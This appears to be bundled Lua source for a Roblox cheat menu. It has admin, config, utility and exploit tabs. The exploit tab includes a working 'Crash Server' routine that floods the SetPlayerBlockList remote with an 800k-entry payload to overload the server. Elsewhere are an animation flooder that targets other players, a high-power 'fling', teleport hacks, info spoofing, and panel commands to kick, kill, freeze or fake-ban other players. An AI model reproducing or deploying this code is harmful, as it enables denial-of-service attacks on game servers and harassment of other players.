__bundle_register("Menu/AdminTab", function(require, _LOADED, __bundle_register, __bundle_modules)
-- AdminTab module -- developer-only admin control panel.
local AdminTab = {}

---@module GUI.Library
local Library = require("GUI/Library")

---@module Utility.Logger
local Logger = require("Utility/Logger")

---@module Features.Admin
local Admin = require("Features/Admin")

---@module Features.Game.Monitoring
local Monitoring = require("Features/Game/Monitoring")

---@module Features.Exploits.AnimationFlooder
local AnimationFlooder = require("Features/Exploits/AnimationFlooder")

---@module Features.Combat.AnimationInspector
local AnimationInspector = require("Features/Combat/AnimationInspector")

---@module Menu.UI
local UI = require("Menu/UI")

local Players = game:GetService("Players")

-- Teleport destinations the ;tp command accepts (see Features/Game/Teleport.lua).
local TP_DESTINATIONS = {
	"EasternLuminant",
	"EtreanLuminant",
	"Depths",
	"Voidheart",
	"TrialOfOne",
	"GuildDoor",
}

---Resolve a live Player from a username (the roster dropdown stores names).
---@param name string
---@return Player?
local function playerFromName(name)
	if type(name) ~= "string" or name == "" then
		return nil
	end

	for _, plr in next, Players:GetPlayers() do
		if plr.Name == name then
			return plr
		end
	end

	return nil
end

---The username the panel is currently pointed at, or nil.
---@return string?
local function selectedName()
	local option = Options and Options["AdminTarget"]
	return option and option.Value or nil
end


---@param name string
---@return string
local function targetToken(name)
	local localPlayer = Players.LocalPlayer
	if localPlayer and name == localPlayer.Name then
		return "me"
	end
	return name
end

---Fire a command at whoever's selected, with a friendly notify either way.
---@param cmd string
---@param extra string?
local function runCommand(cmd, extra)
	local name = selectedName()
	if not name then
		return Logger.notify("Admin panel: pick a player first.")
	end

	if Admin.sendCommand(cmd, targetToken(name), extra) then
		Logger.notify("Admin panel: sent '%s' to %s.", cmd, name)
	else
		Logger.notify("Admin panel: failed to send '%s' (no chat channel).", cmd)
	end
end

---Point the spectate camera at the selected player. 
local function spectateSelected()
	local name = selectedName()
	if not name then
		return Logger.notify("Admin panel: pick a player to spectate.")
	end

	local player = playerFromName(name)
	if not player then
		return Logger.notify("Admin panel: '%s' is no longer in the server.", name)
	end

	if player == Players.LocalPlayer then
		Monitoring.subject = nil
		return Logger.notify("Admin panel: that's you -- camera reset.")
	end

	local character = player.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return Logger.notify("Admin panel: '%s' isn't loaded in yet.", name)
	end

	Monitoring.subject = humanoidRootPart
	Logger.notify("Admin panel: spectating %s.", name)
end

---Release the spectate camera.
local function stopSpectating()
	Monitoring.subject = nil
	Logger.notify("Admin panel: stopped spectating.")
end

--- Initialize the Admin tab.
---@param window table
function AdminTab.init(window)
	local localPlayer = Players.LocalPlayer
	if not localPlayer then
		return
	end

	-- Whitelist gate: the whole tab only exists for developers.
	if not Admin.isDeveloper(localPlayer.UserId) then
		return
	end

	local tab = window:AddTab("Admin", "shield")

	-- Roster of every player in the server (yourself included), kept in sync below. The old library had a
	-- "SpecialType = Player" dropdown that auto-populated; the native UI has no such thing, so we fill it.
	local function rosterNames()
		local names = {}
		for _, p in ipairs(Players:GetPlayers()) do
			names[#names + 1] = p.Name
		end
		table.sort(names)
		return names
	end

	-- ---- Players / spectate ----
	local roster = tab:AddSection("left", "Players")

	local targetDropdown = UI.dropdown(roster, "AdminTarget", "Target Player", {
		Values = rosterNames(),
		AllowNull = true,
	})

	UI.button(roster, "Spectate Selected", spectateSelected)
	UI.button(roster, "Stop Spectating", stopSpectating)
	UI.button(roster, "Bring To Me", function()
		runCommand("bring")
	end)

	-- ---- Commands ----
	local cmds = tab:AddSection("right", "Commands")

	UI.button(cmds, "Freeze", function()
		runCommand("freeze")
	end)
	UI.button(cmds, "Unfreeze", function()
		runCommand("unfreeze")
	end)
	UI.button(cmds, "Kill", function()
		runCommand("kill")
	end)
	UI.button(cmds, "Kick", function()
		runCommand("kick")
	end)
	UI.button(cmds, "Fake Ban", function()
		runCommand("fakeban")
	end)
	UI.button(cmds, "Unload Their Luma", function()
		runCommand("unload")
	end)
	UI.button(cmds, "Fake Agamatsu", function()
		runCommand("fakeagamatsu")
	end)

	-- ---- Teleport ----
	local tp = tab:AddSection("right", "Teleport")

	UI.dropdown(tp, "AdminTpDestination", "Destination", {
		Values = TP_DESTINATIONS,
		Default = TP_DESTINATIONS[1],
	})
	UI.button(tp, "Teleport Selected", function()
		local option = Options and Options["AdminTpDestination"]
		runCommand("tp", option and option.Value or nil)
	end)

	-- ---- Forge Ban (animation flooder) ----
	local flood = tab:AddSection("left", "Forge Ban")

	-- Everyone except yourself (flooding your own character is pointless), sorted.
	local function flooderNames()
		local names = {}
		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= Players.LocalPlayer then
				names[#names + 1] = p.Name
			end
		end
		table.sort(names)
		return names
	end

	local flooderInitial = flooderNames()

	local flooderDropdown = UI.dropdown(flood, "AnimationFlooderTarget", "Target Player", {
		Values = flooderInitial,
		Default = flooderInitial[1] or "",
		Multi = false,
		AllowNull = true,
		Callback = function(name)
			AnimationFlooder.setTargetByName(name)
		end,
	})

	UI.button(flood, "Refresh Player List", function()
		pcall(function() flooderDropdown:SetValues(flooderNames()) end)
	end)

	UI.slider(flood, "AnimationFlooderIntensity", "Intensity", { Default = 8, Min = 1, Max = 50, Rounding = 0 })

	local floodToggle = UI.toggle(flood, "AnimationFlooder", "Flood Player Animations", false, function(state)
		if state then
			AnimationFlooder.startByName(flooderDropdown.Value)
		else
			AnimationFlooder.stop()
		end
	end)
	UI.bind(floodToggle, "N/A", "Toggle")

	-- ---- Animation Logger ----
	local logger = tab:AddSection("left", "Animation Logger")

	-- Yourself included, listed FIRST so it's the default pick -- inspecting your own animations is how you
	-- see what your breaker is actually emitting.
	local function inspectNames()
		local names = {}
		local lp = Players.LocalPlayer
		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= lp then
				names[#names + 1] = p.Name
			end
		end
		table.sort(names)
		if lp then
			table.insert(names, 1, lp.Name)
		end
		return names
	end

	local inspectInitial = inspectNames()

	local inspectDropdown = UI.dropdown(logger, "AnimInspectTarget", "Inspect Player", {
		Values = inspectInitial,
		Default = inspectInitial[1] or "",
		Multi = false,
		AllowNull = true,
		Callback = function(name)
			AnimationInspector.setTargetByName(name)
		end,
	})

	UI.button(logger, "Refresh Player List", function()
		pcall(function() inspectDropdown:SetValues(inspectNames()) end)
	end)

	UI.toggle(logger, "AnimInspectLogToFile", "Log to File", false)

	local inspectToggle = UI.toggle(logger, "AnimationInspector", "Animation Inspector", false, function(state)
		if state then
			AnimationInspector.startByName(inspectDropdown.Value)
		else
			AnimationInspector.stop()
		end
	end)

	-- Keep all three rosters in sync as players join / leave.
	local function refreshAll()
		pcall(function() targetDropdown:SetValues(rosterNames()) end)
		pcall(function() flooderDropdown:SetValues(flooderNames()) end)
		pcall(function() inspectDropdown:SetValues(inspectNames()) end)
	end
	Players.PlayerAdded:Connect(refreshAll)
	Players.PlayerRemoving:Connect(refreshAll)
end

-- Return AdminTab module.
return AdminTab
end)
__bundle_register("Menu/UI", function(require, _LOADED, __bundle_register, __bundle_modules)
-- Menu/UI.lua
-- Thin native helpers over the Luma UI section API (section:AddToggle/AddSlider/AddDropdown/...).
-- These are menu-side sugar so the tab modules read cleanly and map obsidian-era parameters
-- (Rounding, "N/A" keys, Multi dropdowns) onto the native single-table controls. They do NOT
-- reimplement the library -- every call goes straight to a native section method.

---@module GUI.Library
local Library = require("GUI/Library")

local UI = {}

-- Anonymous controls (old `AddX(nil, {...})` form-editor fields) must NOT derive a flag from their label:
-- the native library's flagOf() would turn a nil flag into the label text, so two forms sharing a label
-- (e.g. the Create and Edit timing forms) would collide in Library.Options and get written to configs.
-- Give each a unique throwaway flag and keep it out of config saves. Real flags pass straight through.
local anonCounter = 0
local function resolveFlag(flag)
	if flag ~= nil then
		return flag
	end
	anonCounter = anonCounter + 1
	local f = "__anon" .. anonCounter
	if Library and Library.NoSave then
		Library.NoSave[f] = true
	end
	return f
end

---Normalize an obsidian keypicker default ("N/A"/"None"/"V") to a native key name ("none"/"v").
---@param default any
---@return string
local function keyName(default)
	if default == nil or default == "N/A" or default == "None" or default == "n/a" then
		return "none"
	end
	return tostring(default):lower()
end
UI.keyName = keyName

---@param section table
---@param flag string
---@param name string
---@param default boolean?
---@param callback function?
---@return table toggle handle (chainable :AddKeybind / :AddColorPicker)
function UI.toggle(section, flag, name, default, callback)
	local opts = { Flag = resolveFlag(flag), Name = name, Default = default or false, Callback = callback }
	-- Display registers the toggle in the array list (and keybind list) while it's on. Only real feature
	-- toggles (those with an explicit flag) get it; the builder's anonymous per-timing form fields (nil flag)
	-- stay out so they don't flood the array list.
	if flag ~= nil then
		opts.Display = name
	end
	return section:AddToggle(opts)
end

---@param section table
---@param flag string
---@param name string
---@param o table { Min, Max, Default, Suffix, Rounding, Callback }
---@return table slider handle (.Value / :Set / :SetRawValue)
function UI.slider(section, flag, name, o)
	o = o or {}
	local rounding = o.Rounding or 0
	local increment = rounding > 0 and (10 ^ -rounding) or 1
	return section:AddSlider({
		Flag = resolveFlag(flag),
		Name = name,
		Min = o.Min or 0,
		Max = o.Max or 100,
		Default = o.Default or o.Min or 0,
		Suffix = o.Suffix,
		Increment = increment,
		Decimals = rounding,
		Callback = o.Callback,
	})
end

---@param section table
---@param flag string
---@param name string
---@param o table { Values, Default, Multi, AllowNull, Searchable, SaveValues, Callback }
---@return table dropdown handle (.Value / .Values / :SetValues / :SetValue / :Display)
function UI.dropdown(section, flag, name, o)
	o = o or {}
	return section:AddDropdown({
		Flag = resolveFlag(flag),
		Name = name,
		Values = o.Values or {},
		Default = o.Default,
		Multi = o.Multi,
		AllowNull = o.AllowNull,
		Searchable = o.Searchable,
		SaveValues = o.SaveValues,
		Callback = o.Callback,
	})
end

---@param section table
---@param flag string
---@param name string
---@param placeholder string?
---@param default string?
---@param callback function?
---@return table input handle (.Value / :Set / :Get)
function UI.input(section, flag, name, placeholder, default, callback)
	return section:AddTextbox({ Flag = resolveFlag(flag), Label = name, Placeholder = placeholder, Default = default, Callback = callback })
end

---@param section table
---@param name string
---@param callback function
function UI.button(section, name, callback)
	return section:AddButton({ Name = name, Callback = callback })
end

---A button that must be clicked twice to fire (first click arms it and shows `confirmName`,
---auto-disarming after a couple seconds). Used for destructive actions the old UI guarded with DoubleClick.
---@param section table
---@param name string
---@param confirmName string
---@param callback function
function UI.confirmButton(section, name, confirmName, callback)
	local armed = false
	local btn
	btn = section:AddButton({ Name = name, Callback = function()
		if not armed then
			armed = true
			btn.Text = confirmName
			task.delay(2.5, function()
				if armed then
					armed = false
					btn.Text = name
				end
			end)
			return
		end
		armed = false
		btn.Text = name
		callback()
	end })
	return btn
end

function UI.label(section, text)
	return section:AddLabel(text)
end

function UI.divider(section)
	return section:AddDivider()
end

---Attach a keybind to a toggle handle (press flips / holds the toggle). Returns the toggle for chaining.
---@param handle table toggle handle
---@param default any obsidian default key ("N/A"/"V"/...)
---@param mode string? "Toggle" | "Hold"
function UI.bind(handle, default, mode)
	return handle:AddKeybind({ Default = keyName(default), Mode = mode or "Toggle" })
end

---Attach a color picker to a toggle handle (chains). Returns the toggle for chaining.
---@param handle table toggle handle
---@param flag string color flag (read as Options[flag].Value / Flags[flag])
---@param default Color3?
---@param noAlpha boolean?
function UI.color(handle, flag, default, noAlpha)
	return handle:AddColorPicker({ Flag = flag, Default = default, NoAlpha = noAlpha })
end

---Standalone keybind row in a section (registered under its own flag so feature code can read it).
---@param section table
---@param flag string
---@param name string
---@param default any
---@param callback function?
---@param hideFromList boolean? when true, the key still works + saves but never shows on the hotkey list
---@return table keybind handle (.Value / .Key / :GetState)
function UI.keybind(section, flag, name, default, callback, hideFromList)
	return section:AddKeybind({ Flag = resolveFlag(flag), Name = name, Default = keyName(default), Callback = callback, HideFromList = hideFromList })
end

return UI

end)
__bundle_register("Menu/ConfigTab", function(require, _LOADED, __bundle_register, __bundle_modules)
local ConfigTab = {}

---@module GUI.Icons
local Icons = require("GUI/Icons")

---@module GUI.Library
local Library = require("GUI/Library")

---@module Utility.Logger
local Logger = require("Utility/Logger")

---@module Menu.UI
local UI = require("Menu/UI")

---@param window table
function ConfigTab.init(window)
	local tab = window:AddTab("Config", "save", { Full = true })
	local section = tab:AddSection("left", "Configs")

	local nameInput = UI.input(section, "ConfigName", "Config Name", "Enter a config name.")
	local configList = UI.dropdown(section, "ConfigList", "Saved Configs", {
		Values = Library:ListConfigs(),
		AllowNull = true,
	})

	local function refresh()
		configList:SetValues(Library:ListConfigs())
		configList:Display()
	end

	UI.button(section, "Save", function()
		local name = nameInput.Value
		if not name or name == "" then
			name = configList.Value
		end
		if Library:SaveConfig(name) then
			Logger.notify("Saved config '%s'.", tostring(name))
			refresh()
		end
	end)

	UI.button(section, "Load", function()
		local name = configList.Value
		if name and name ~= "" then
			Library:LoadConfig(name)
			Logger.notify("Loaded config '%s'.", tostring(name))
		end
	end)

	UI.button(section, "Delete", function()
		local name = configList.Value
		if name and name ~= "" then
			Library:DeleteConfig(name)
			Logger.notify("Deleted config '%s'.", tostring(name))
			refresh()
		end
	end)

	UI.button(section, "Set As Autoload", function()
		local name = configList.Value
		if name and name ~= "" then
			Library:SetAutoload(name)
			Logger.notify("'%s' will autoload on launch.", tostring(name))
		end
	end)

	UI.button(section, "Refresh List", refresh)
end

return ConfigTab

end)
__bundle_register("Menu/UtilityTab", function(require, _LOADED, __bundle_register, __bundle_modules)
local UtilityTab = {}

---@module GUI.Icons
local Icons = require("GUI/Icons")

---@param window table
function UtilityTab.init(window)
	local GameTab = require("Menu/GameTab")
	local VisualsTab = require("Menu/VisualsTab")
	local ExploitTab = require("Menu/ExploitTab")
	local UI = require("Menu/UI")
	local Wipe = require("Game/Wipe")
	local ServerHop = require("Game/ServerHop")
	local PersistentData = require("Utility/PersistentData")
	local Logger = require("Utility/Logger")
	local players = game:GetService("Players")

	-- Teleports are hidden inside Depths / Missions / Dungeons (same gate as the old build).
	local realmOk = true
	pcall(function()
		local replicatedStorage = game:GetService("ReplicatedStorage")
		local info = replicatedStorage:WaitForChild("Info", 5)
		local realmInfo = info and info:WaitForChild("RealmInfo", 5)
		local currentWorld = (realmInfo and require(realmInfo).CurrentWorld) or "N/A"
		if currentWorld == "Depths" or currentWorld == "Mission" or currentWorld == "Dungeon" then
			realmOk = false
		end
	end)

	local pages = {
		{ Name = "Movement" },
		{ Name = "Exploits" },
	}
	if realmOk then
		pages[#pages + 1] = { Name = "Teleports" }
	end
	pages[#pages + 1] = { Name = "Monitoring" }
	pages[#pages + 1] = { Name = "Info" }
	pages[#pages + 1] = { Name = "Trackers" }
	pages[#pages + 1] = { Name = "World" }
	pages[#pages + 1] = { Name = "Actions" }

	local tab = window:AddTab("Utility", "wrench", { Pages = pages })

	-- Alternate left/right columns per page.
	local sideState = {}
	local function sec(page, title)
		local side = sideState[page] or "left"
		sideState[page] = (side == "left") and "right" or "left"
		return tab:AddSection(side, title, page)
	end

	local actions = sec("Actions", "Character Actions")
	local function currentSlot()
		local player = players.LocalPlayer
		local slot = player and player:GetAttribute("DataSlot")
		if type(slot) ~= "string" or slot == "" then
			return nil
		end
		return slot
	end

	UI.confirmButton(actions, "Wipe Character", "ARE YOU SURE?", function()
		local slot = currentSlot()
		if not slot then
			return Logger.warn("Wipe failed: no data slot is selected.")
		end

		local ok, err = pcall(Wipe.invoke, slot)
		if not ok then
			Logger.warn("Wipe failed:", tostring(err))
		end
	end)

	UI.confirmButton(actions, "Serverhop", "ARE YOU SURE?", function()
		local slot = currentSlot() or PersistentData.get("shslot")
		if type(slot) ~= "string" or slot == "" then
			return Logger.warn("Serverhop failed: no data slot is selected.")
		end

		local ok, err = pcall(ServerHop.hop, slot, true)
		if not ok then
			Logger.warn("Serverhop failed:", tostring(err))
		end
	end)

	GameTab.initMovementSection(sec("Movement", "Movement"))

	ExploitTab.initMobExploitsSection(sec("Exploits", "Mob Exploits"))
	ExploitTab.initLocalCharacterExploitsSection(sec("Exploits", "Local Character"))
	ExploitTab.initServerExploitsSection(sec("Exploits", "Server"))
	VisualsTab.initMorphLoaderSection(sec("Exploits", "Morph Loader"))

	if realmOk then
		ExploitTab.initTeleportsSection(sec("Teleports", "Teleports"))
	end

	GameTab.initPlayerMonitoringSection(sec("Monitoring", "Player Monitoring"))

	GameTab.initInfoSpoofingSection(sec("Info", "Info Spoofing"))

	VisualsTab.initVisualAssistanceSection(sec("Trackers", "Visual Assistance"))
	GameTab.initRevealAnimationsSection(sec("Trackers", "Reveal Animations"))

	VisualsTab.initWorldVisualsSection(sec("World", "World Visuals"))
	GameTab.initEffectRemovalsSection(sec("World", "Effect Removals"))
	GameTab.initInstanceRemovalsSection(sec("World", "Instance Removals"))
	VisualsTab.initVisualRemovalsSection(sec("World", "Visual Removals"))
	GameTab.initTweeningSection(sec("World", "Tweening"))
end

return UtilityTab

end)
__bundle_register("Menu/ExploitTab", function(require, _LOADED, __bundle_register, __bundle_modules)
local ExploitTab = {}

---@module GUI.Icons
local Icons = require("GUI/Icons")

---@module Features.Game.Teleport
local Teleport = require("Features/Game/Teleport")

---@module Menu.ServerActions
local ServerActions = require("Menu/ServerActions")

---@module Menu.UI
local UI = require("Menu/UI")

---@param section table
function ExploitTab.initMobExploitsSection(section)
	local voidMobsToggle = UI.toggle(section, "VoidMobs", "Void Mobs", false)
	UI.bind(voidMobsToggle, "N/A", "Toggle")
end

---@param section table
function ExploitTab.initLocalCharacterExploitsSection(section)
	local moveWhileKnockedToggle = UI.toggle(section, "MoveWhileKnocked", "Move While Knocked", false)
	UI.bind(moveWhileKnockedToggle, "N/A", "Toggle")

	local flingToggle = UI.toggle(section, "Fling", "Fling", false)
	UI.bind(flingToggle, "N/A", "Toggle")
	UI.slider(section, "FlingPower", "Fling Power", {
		Default = 100000,
		Min = 1000,
		Max = 1000000,
		Rounding = 0,
		Suffix = " studs/s",
	})
end

---@param section table
---@param text string
---@param dest string
local function addTeleportButton(section, text, dest)
	UI.button(section, text, function()
		Teleport.start(dest)
	end)
end

---@param section table
function ExploitTab.initTeleportsSection(section)
	ServerActions.init(section)

	local Locations = {
		[6032399813] = {
			["Etris"] = CFrame.new(1006, 412, -4412),
			["Minityrsa"] = CFrame.new(-1307, 442, -6573),
			["Lower Erisia"] = CFrame.new(79, 36, 220),
			["Upper Erisia"] = CFrame.new(1593, 872, 907),
			["Isle Of Vigils"] = CFrame.new(-1580, 350, 2658),
			["Warspot"] = CFrame.new(-4329, 985, 4180)
		},
		[6473861193] = {
			["Songseeker"] = CFrame.new(250, 432, -2870),
			["Summer Isle"] = CFrame.new(-2105, 414, -678),
			["Miner's Landing"] = CFrame.new(-3158, 509, 3199),
			["Starfield Veldt"] = CFrame.new(1546, 749, 4060),
			["The Entropy Catalyst"] = CFrame.new(1307, 980, 1980),
			["Moon's Eyrie"] = CFrame.new(-4945, 480, -13955),
			["Monkey's Paw"] = CFrame.new(-9357, 789, -6687),
			["Thresher's Nest"] = CFrame.new(-5499, 1040, -362),
			["Starswept Valley"] = CFrame.new(-5499, 1040, -362),
			["Great Hive"] = CFrame.new(-7391, 962, -313),
			["Metoer Isle"] = CFrame.new(-7884, 159, 1118),
			["Fort Merit"] = CFrame.new(-7612, 671, 3013),
			["Ferryman Island"] = CFrame.new(-4601, 158, 9527),
		}
	}

	local currentPlaceId = game.PlaceId
	local placeData = Locations[currentPlaceId]

	if placeData then
		local teleportList = {}
		for name, _ in pairs(placeData) do
			table.insert(teleportList, name)
		end

		local teleportsdropdown = UI.dropdown(section, "Teleports", "Teleports List", {
			Values = teleportList,
			Multi = false,
			AllowNull = true,
		})

		UI.button(section, "Teleport To Location", function()
			local selected = teleportsdropdown.Value
			local targetCFrame = placeData[selected]

			if targetCFrame then
				Teleport.Safetweenstart(targetCFrame, 190)
			end
		end)
	end

	if game.PlaceId == 6032399813 then
		addTeleportButton(section, "Teleport to Eastern Luminant", "EasternLuminant")
		addTeleportButton(section, "Teleport to Trial Of One", "TrialOfOne")
	end

	if game.PlaceId == 6473861193 then
		addTeleportButton(section, "Teleport to Etrean Luminant", "EtreanLuminant")
	end

	addTeleportButton(section, "Teleport to Depths", "Depths")
	addTeleportButton(section, "Teleport to Voidheart", "Voidheart")

	UI.button(section, "Stop Teleporting", Teleport.stop and Teleport.Safetweenstop)

	UI.divider(section)

	UI.input(section, "GuildDoorName", "Guild Door Name", "Exact or partial name of door.")

	addTeleportButton(section, "Teleport To Guild Door", "GuildDoor")
end

---@param section table
function ExploitTab.initServerExploitsSection(section)
	-- Crash Server: floods RobloxReplicatedStorage.SetPlayerBlockList with a massive block-list payload the
	-- server has to deserialize/process, overrunning it. Built + sent off the UI thread so the menu doesn't
	-- hitch while the ~800k-entry table is constructed.
	UI.button(section, "Crash Server", function()
		task.spawn(function()
			local robloxReplicated = game:FindFirstChild("RobloxReplicatedStorage")
			local remote = robloxReplicated and robloxReplicated:FindFirstChild("SetPlayerBlockList")
			if not remote then
				return
			end

			local entries = 799999
			local payload = table.create(entries)
			for i = 1, entries do
				payload[i] = { id = i, v = i * 2 }
			end

			remote:FireServer(payload)
		end)
	end)
end

return ExploitTab

end)
